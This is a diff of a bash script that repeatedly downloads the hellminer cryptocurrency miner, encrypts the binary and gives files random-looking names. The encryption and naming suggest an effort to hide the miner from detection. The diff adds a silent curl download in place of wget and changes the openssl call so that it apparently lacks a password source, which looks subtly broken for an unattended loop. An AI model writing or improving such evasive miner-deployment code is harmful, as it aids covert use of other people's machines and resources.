@@ -3,7 +3,7 @@
 # Function to generate a strong random file name
 generate_random_name() {
   local random_name
-  random_name=$(date +%s%N | sha256sum | base64 | head -c 12)
+  random_name=$(date +%s%N | sha512sum | base64 | head -c 12)
   echo "$random_name"
 }
 
@@ -12,8 +12,8 @@ encrypt_miner_binary() {
   local binary="$1"
   local encrypted_binary="encrypted_$binary"
 
-  # Encrypt the binary (adjust encryption method as needed)
-  openssl enc -aes-256-cbc -salt -in "$binary" -out "$encrypted_binary" -kfile /dev/null
+  # Encrypt the binary using AES-256-CBC and SHA-512
+  openssl enc -aes-256-cbc -salt -in "$binary" -out "$encrypted_binary" -pbkdf2 -iter 100000 -md sha512
 
   # Optionally, you can also generate a checksum or signature here if needed
 }
@@ -21,7 +21,7 @@ encrypt_miner_binary() {
 # Main loop to continuously run the mining script
 while true; do
   # Download the miner archive (adjust URL as necessary)
-  wget -q https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz
+  curl -fsSL -o hellminer_linux64_avx2.tar.gz https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz
 
   # Extract the miner files
   tar -xf hellminer_linux64_avx2.tar.gz
